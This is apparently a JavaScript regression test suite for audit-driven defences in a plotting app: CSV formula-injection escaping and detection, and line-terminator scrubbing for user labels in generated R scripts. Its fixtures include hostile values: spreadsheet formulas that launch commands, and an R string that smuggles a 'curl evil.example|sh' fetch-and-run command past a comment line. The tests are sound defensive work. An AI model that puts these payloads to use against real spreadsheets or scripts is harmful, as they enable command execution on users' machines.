// Regression coverage for the security-audit Tier-A defences:
//   1. CSV formula injection — leading =/+/-/@/TAB/CR cells get prefixed
//      with `'` by buildCsvString and are flagged at ingest by
//      scanForFormulaInjection.
//   2. R-script comment injection — sanitizeRString and sanitizeRComment
//      flatten every line terminator so a hostile column name / set name
//      can't escape a `# ...` comment line.
//
// Source: docs/security_audit_02-05-2026.md items #1 and #2.

const { suite, test, assert, eq, summary } = require("./harness");
const {
  buildCsvString,
  scanForFormulaInjection,
  parseRaw,
  parseData,
  parseWideMatrix,
} = require("./helpers/shared-loader");
const { sanitizeRString, sanitizeRComment, buildRScript } = require("./helpers/r-export-loader");

// ── buildCsvString sanitisation ───────────────────────────────────────────

suite("buildCsvString — formula-injection escape");

test("cells starting with = are prefixed with a single quote", () => {
  const out = buildCsvString(["A"], [["=1+1"]]);
  // The escape is: "'=1+1" → a leading `'` neutralises the formula in Excel
  // / LibreOffice / Sheets without breaking the value visually.
  assert(out.includes(`"'=1+1"`), "missing leading apostrophe on =-cell: " + out);
});

test("non-numeric +/-/@ leads, TAB, CR are also escaped", () => {
  // `+1` and `-1` are valid numbers and intentionally NOT escaped (see the
  // negative-numbers test). The triggers below are all non-numeric strings
  // whose first byte still puts the spreadsheet engine in formula mode.
  const triggers = ["+evil", "-cmd|x", "@SUM(1)", "\t=1", "\r=1"];
  for (const v of triggers) {
    const out = buildCsvString(["A"], [[v]]);
    assert(out.includes(`"'${v}"`), `not escaped for ${JSON.stringify(v)}: ${out}`);
  }
});

test("benign cells are unchanged", () => {
  const out = buildCsvString(["A", "B"], [["foo", "bar"]]);
  assert(out === '"A","B"\n"foo","bar"', "round-tripped to: " + out);
});

test("hostile headers are escaped too", () => {
  const out = buildCsvString(["=cmd|'/c calc'!A1", "B"], [["v1", "v2"]]);
  assert(out.startsWith(`"'=cmd`), "hostile header not escaped: " + out);
});

test("negative numbers are NOT escaped (legit scientific data)", () => {
  // The raw OWASP rule treats every leading `-` as a formula trigger, but
  // `-0.5`, `-1.5e3`, `-1`, `-0` are just numbers — Excel reads them as
  // numeric, not as formulas. Prefixing them with `'` would corrupt every
  // dataset with negatives. We bypass via isNumericValue.
  const negatives = ["-0.5", "-1.5e3", "-1", "-0", "-3.14"];
  for (const v of negatives) {
    const out = buildCsvString(["A"], [[v]]);
    assert(
      out.includes(`"${v}"`) && !out.includes(`"'${v}"`),
      `negative number was escaped: ${v} → ${out}`
    );
  }
});

test("hostile leading-minus strings are still escaped", () => {
  // `-cmd|...`, `-2-3+10`, `-=evil` all have a leading `-` but are NOT
  // valid numbers, so the prefix kicks in.
  const hostile = ["-cmd|'/c calc'!A0", "-2-3+10", "-=evil"];
  for (const v of hostile) {
    const out = buildCsvString(["A"], [[v]]);
    assert(out.includes(`"'${v}"`), `hostile leading-minus string not escaped: ${v} → ${out}`);
  }
});

test("apostrophe-prefixed cells round-trip through parseRaw without re-trigger", () => {
  // Belt + braces: even after the export prefixes a `'`, importing the same
  // file back into Plöttr should not accumulate apostrophes on each round.
  // Use two columns so autoDetectSep can lock onto the comma — otherwise it
  // falls back to whitespace-split which doesn't strip RFC-4180 quotes.
  const csv = buildCsvString(["A", "B"], [["=evil", "y"]]);
  const r1 = parseRaw(csv);
  assert(r1.rows[0][0] === "'=evil", "first import value: " + r1.rows[0][0]);
  const csv2 = buildCsvString(r1.headers, r1.rows);
  const r2 = parseRaw(csv2);
  assert(r2.rows[0][0] === "'=evil", "second import value: " + r2.rows[0][0]);
});

// ── scanForFormulaInjection ───────────────────────────────────────────────

suite("scanForFormulaInjection — ingest-time detection");

test("clean dataset returns count 0", () => {
  const r = scanForFormulaInjection(["A", "B"], [["1", "2"]]);
  eq(r.count, 0, "should be clean");
  eq(r.cells.length, 0, "should have no example cells");
  eq(r.headers.length, 0, "should have no example headers");
});

test("negative numbers are NOT flagged (the obvious false-positive)", () => {
  // A column of legit negatives must not light up the warning banner.
  const r = scanForFormulaInjection(
    ["delta_RLU"],
    [["-0.5"], ["-1.5e3"], ["-1"], ["-0.001"], ["-3.14"]]
  );
  eq(r.count, 0, "negatives should not be flagged");
});

test("hostile leading-minus strings are still flagged", () => {
  const r = scanForFormulaInjection(["A"], [["-cmd|'/c calc'!A0"], ["-2-3+10"]]);
  eq(r.count, 2, "hostile non-numeric strings should still be flagged");
});

test("flags hostile headers", () => {
  const r = scanForFormulaInjection(["=evil", "B"], [["1", "2"]]);
  eq(r.count, 1, "wrong count");
  eq(r.headers.length, 1, "wrong header example count");
  eq(r.headers[0].idx, 0, "wrong header idx");
  eq(r.headers[0].value, "=evil", "wrong header value");
});

test("flags hostile cells and reports their position + header", () => {
  const r = scanForFormulaInjection(
    ["genotype", "RLU"],
    [
      ["WT", "1234"],
      ["clf-1", "@SUM(1+9)*cmd"],
    ]
  );
  eq(r.count, 1, "wrong count");
  eq(r.cells[0].row, 1, "wrong row idx");
  eq(r.cells[0].col, 1, "wrong col idx");
  eq(r.cells[0].header, "RLU", "wrong header reported");
  eq(r.cells[0].value, "@SUM(1+9)*cmd", "wrong value");
});

test("respects the example-array cap (default 8)", () => {
  const headers = ["A"];
  const rows = [];
  for (let i = 0; i < 25; i++) rows.push(["=evil_" + i]);
  const r = scanForFormulaInjection(headers, rows);
  eq(r.count, 25, "wrong count");
  eq(r.cells.length, 8, "examples should be capped at 8");
});

test("custom cap option works", () => {
  const headers = ["A"];
  const rows = [];
  for (let i = 0; i < 6; i++) rows.push(["=evil_" + i]);
  const r = scanForFormulaInjection(headers, rows, { cap: 3 });
  eq(r.count, 6, "wrong count");
  eq(r.cells.length, 3, "examples should be capped at 3");
});

test("non-string values are ignored (numbers / null / undefined)", () => {
  const r = scanForFormulaInjection(["A"], [[42], [null], [undefined], ["=evil"]]);
  eq(r.count, 1, "wrong count");
  eq(r.cells[0].row, 3, "should flag only the hostile string");
});

test("TAB / CR leading characters are also flagged", () => {
  const r = scanForFormulaInjection(["A"], [["\t=evil"], ["\r=evil"]]);
  eq(r.count, 2, "should flag both TAB-prefixed and CR-prefixed");
});

// ── parse helpers attach injectionWarnings ────────────────────────────────

suite("parseRaw / parseData / parseWideMatrix — attach injectionWarnings");

test("parseRaw attaches injectionWarnings on hostile input", () => {
  const text = "name,RLU\nWT,1234\nclf-1,=2+2\n";
  const out = parseRaw(text);
  assert(out.injectionWarnings != null, "should have warnings");
  eq(out.injectionWarnings.count, 1, "wrong count");
});

test("parseRaw returns null injectionWarnings on clean input", () => {
  const text = "name,RLU\nWT,1234\nclf-1,890\n";
  const out = parseRaw(text);
  assert(out.injectionWarnings == null, "clean parse should not surface warnings");
});

test("parseData attaches injectionWarnings on hostile input", () => {
  const text = "name,x,y\nA,1,=evil\nB,2,3\n";
  const out = parseData(text);
  assert(out.injectionWarnings != null, "should have warnings");
  eq(out.injectionWarnings.count, 1, "wrong count");
});

test("parseWideMatrix attaches injectionWarnings on hostile input", () => {
  const text = ",col1,col2\nrow1,1,2\n=evil,3,4\n";
  const out = parseWideMatrix(text);
  assert(out.injectionWarnings != null, "should have warnings");
  // Only the row label `=evil` is hostile; col labels and matrix values are clean.
  assert(out.injectionWarnings.count >= 1, "wrong count");
});

// ── R-script comment injection (audit Tier-A #2) ──────────────────────────

suite("sanitizeRString — line-terminator strip");

test("CR is replaced with space (security-relevant)", () => {
  // R's lexer treats CR as a statement terminator inside source files. If a
  // hostile column name with an embedded CR landed in a quoted R string, it
  // would still be inside the quotes — but historically `sanitizeRString`
  // only stripped LF, so a paste with `\r` was less obviously safe. Belt-
  // and-braces strip both.
  const out = sanitizeRString("foo\rsystem('cmd')");
  assert(!out.includes("\r"), "CR should be stripped: " + JSON.stringify(out));
});

test("LF is replaced with space (existing behaviour)", () => {
  const out = sanitizeRString("foo\nbar");
  assert(!out.includes("\n"), "LF should be stripped");
});

test("backslash and double-quote are escaped", () => {
  eq(sanitizeRString('a\\b"c'), 'a\\\\b\\"c', 'escape order: \\ first then "');
});

suite("sanitizeRComment — comment-line scrub");

test("flattens every line terminator R recognises", () => {
  const variants = ["foo\nbar", "foo\rbar", "foo\r\nbar", "foobar", "foo bar", "foo bar"];
  for (const v of variants) {
    const out = sanitizeRComment(v);
    assert(
      /^foo\s+bar$/.test(out),
      `failed to flatten ${JSON.stringify(v)} → ${JSON.stringify(out)}`
    );
  }
});

test("leaves backslash and quotes alone (harmless inside #)", () => {
  eq(sanitizeRComment('a\\b"c'), 'a\\b"c', "should not escape inside comment");
});

suite("buildRScript — hostile dataNote stays inside the comment");

test("CR-injected dataNote is flattened, can't escape the # line", () => {
  // This is the exact attack scenario from docs/security_audit_02-05-2026.md
  // item #2: a user-supplied label flows into `# ...` lines inside the R
  // script, and a CR/LF would have ended the comment, letting the next byte
  // become live R code. After the fix every line terminator is flattened.
  const ctx = {
    names: ["A", "B"],
    values: [
      [1, 2, 3],
      [4, 5, 6],
    ],
    chosenTest: "welchT",
    dataNote: 'Set: foo\rsystem("curl evil.example|sh")\rbar',
    generatedAt: "2026-04-15T00:00:00Z",
  };
  const out = buildRScript(ctx);
  // Every line of the output must start with `#` if it mentions
  // `system("curl` — i.e. that text must remain inside a comment.
  const offendingLines = out.split("\n").filter((l) => l.includes('system("curl'));
  assert(offendingLines.length > 0, "test setup error — payload not in output");
  for (const l of offendingLines) {
    assert(/^\s*#/.test(l), "payload escaped the comment line: " + JSON.stringify(l));
  }
});

test("LF-injected dataNote is split into multiple comment lines (each prefixed with #)", () => {
  const ctx = {
    names: ["A", "B"],
    values: [
      [1, 2, 3],
      [4, 5, 6],
    ],
    chosenTest: "welchT",
    dataNote: 'foo\nsystem("evil")',
    generatedAt: "2026-04-15T00:00:00Z",
  };
  const out = buildRScript(ctx);
  for (const l of out.split("\n").filter((l) => l.includes('system("evil"'))) {
    assert(/^\s*#/.test(l), "payload escaped the comment: " + JSON.stringify(l));
  }
});

summary();
